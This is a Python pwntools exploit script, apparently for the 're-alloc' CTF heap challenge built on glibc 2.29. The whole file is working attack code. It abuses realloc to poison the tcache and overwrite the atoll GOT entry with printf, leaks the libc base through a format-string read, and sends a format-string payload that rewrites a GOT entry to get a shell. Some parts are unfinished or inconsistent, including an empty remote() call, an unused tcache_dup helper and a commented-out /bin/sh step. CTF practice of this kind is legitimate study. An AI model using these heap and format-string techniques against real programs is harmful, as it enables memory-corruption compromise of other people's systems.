#!/usr/bin/env python3
from pwn import *

DUMMY = 0xdeadbeef
OBJ0 = 0
OBJ1 = 1

elf = ELF("./re-alloc_patched")
libc = ELF("./given/libc-9bb401974abeef59efcdd0ae35c5fc0ce63d3e7b.so")
ld = ELF("./ld-2.29.so")
context.arch = "amd64"

if args.REMOTE:
    p = remote()
else:
    p = process([ld.path, elf.path], env={"LD_PRELOAD": libc.path})
    if args.D:
        context.terminal = ["tmux", "splitw", "-h"]
        gdb.attach(p, "\n".join([
                "b *0x40176d", # main()'s exit
                #"b *0x40155c", # reallocate()'s realloc
            ]))

def alloc_data(index, size, data):
    assert(size < 0x79)
    p.sendlineafter(b"Your choice:", b"1")
    p.sendlineafter(b"Index:", str(index).encode())
    p.sendlineafter(b"Size", str(size).encode())
    p.sendafter(b"Data", data)
    log.info("allocate with size {}".format(size))

def realloc_data(index, size, data):
    assert(size < 0x79)
    p.sendlineafter(b"Your choice:", b"2")
    p.sendlineafter(b"Index:", str(index).encode())
    p.sendlineafter(b"Size:", str(size).encode())
    if size != 0:
        p.sendafter(b"Data:", data)
    log.info("reallocate with size {}".format(size))

def free_data(index):
    realloc_data(index, 0, b"")
    p.recvuntil(b"alloc error")

def free_and_clear_data(index):
    p.sendlineafter(b"Your choice:", b"3")
    p.sendlineafter(b"Index:", str(index).encode())
    log.info("free and clear data heap_0x4040b0[{}]".format(index))

def tc_poison_arbit_write(addr, value, size):
    """
    tcache poisoning with realloc
    """

    alloc_data(OBJ0, size, p64(DUMMY))
    alloc_data(OBJ1, size, p64(DUMMY))
    free_and_clear_data(OBJ0)
    free_data(OBJ1)

    # allocate the same size will not change the pointer
    realloc_data(OBJ1, size, p64(addr))

    # realloc with size + 0x10 will change the chunk->size

    alloc_data(OBJ0, size, p64(DUMMY))
    realloc_data(OBJ0, size + 0x10, p64(DUMMY))
    free_and_clear_data(OBJ0)

    alloc_data(OBJ0, size, value)


def tcache_dup(addr, value, size):
    alloc_data(OBJ0, size, p64(DUMMY))
    free_data(OBJ0)
    free_and_clear_data(OBJ0)

def test():
    size = 0x40
    alloc_data(OBJ0, size, p64(DUMMY))
    realloc_data(OBJ0, size + 0x18, p64(DUMMY))
    free_and_clear_data(OBJ0)

def fmtstr_leak_libc():
    p.sendlineafter(b"Your choice:", b"1")
    p.sendlineafter(b"Index:", b"%9$p")
    leak_str = p.recvline()
    leak = int(leak_str, 16)
    libc_base = leak + 0x4d3000 - 0x693760
    log.info("libc base:" + hex(libc_base))
    return libc_base

def fmtstr_pop_shell():

    # write 1 byte one at a time
    payload = fmtstr_payload(8,
                             {elf.got["realloc"]: 0x40},
                             strategy="small")

    print("len {}".format(len(payload)))

    p.sendlineafter(b"Your choice:", b"1")
    p.sendlineafter(b"Index:", payload)

    #p.sendlineafter(b"Your choice:", b"1")
    #p.sendlineafter(b"Index:", b"/bin/sh\x00")

def exploit():

    tc_poison_arbit_write(elf.got["atoll"], p64(elf.plt["printf"]), 0x40)
    # after this, it changes to a

    libc_base = fmtstr_leak_libc()
    libc.address = libc_base

    fmtstr_pop_shell()

    p.interactive()

if __name__ == "__main__":

    exploit()
